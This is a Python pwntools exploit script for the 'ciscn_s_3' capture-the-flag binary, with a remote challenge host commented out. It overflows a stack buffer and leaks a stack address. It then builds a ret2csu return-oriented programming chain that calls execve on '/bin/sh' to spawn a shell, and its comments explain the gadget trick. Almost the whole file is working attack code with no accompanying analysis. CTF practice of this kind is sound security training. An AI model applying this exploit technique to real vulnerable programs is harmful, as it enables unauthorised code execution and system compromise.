from pwn import *

context.log_level = "debug"

exe = ELF("./ciscn_s_3")
vuln = p64(0x4004F1)
pop_rdi = p64(0x4005A3)
rax_0x3b = p64(0x4004E2)
csu_pop = p64(0x40059A)
csu_call = p64(0x400580)
syscall = p64(0x400501)

#    0x400580 <__libc_csu_init+64>:	mov    rdx,r13
#    0x400583 <__libc_csu_init+67>:	mov    rsi,r14
#    0x400586 <__libc_csu_init+70>:	mov    edi,r15d
#    0x400589 <__libc_csu_init+73>:	call   QWORD PTR [r12+rbx*8]

#    0x40059a <__libc_csu_init+90>:	pop    rbx
#    0x40059b <__libc_csu_init+91>:	pop    rbp
#    0x40059c <__libc_csu_init+92>:	pop    r12
#    0x40059e <__libc_csu_init+94>:	pop    r13
#    0x4005a0 <__libc_csu_init+96>:	pop    r14
#    0x4005a2 <__libc_csu_init+98>:	pop    r15
#    0x4005a4 <__libc_csu_init+100>:	ret

# 0x00000000004005a3 : pop rdi ; ret
# 0x00000000004004e2 : mov rax, 0x3b ; ret
# 0x0000000000400501 : syscall

r = exe.process()
# r = remote("node4.buuoj.cn", 26303)
r.send(cyclic(0x10) + vuln)
r.recv(0x20)
bin_sh = u64(r.recv(8)) - 0x140
# 0x140 on localhost, 0x110 on remote
success(hex(bin_sh))
gdb.attach(r)
r.send(
    b"/bin/sh\x00"
    + cyclic(0x8)
    + csu_pop
    + p64(0) * 2
    + p64(bin_sh + 0x50)
    + p64(0) * 3
    + csu_call
    + pop_rdi
    + p64(bin_sh)
    + rax_0x3b
    + syscall
)
# call pop_rdi actually do pop twice -- first pop the address pushed by call instruction,
# then at this time pop_rdi is on the top of stack, so second return to pop_rdi again to pop
# the real bin_sh address, this is a really powerful ret2csu trick  

r.interactive()
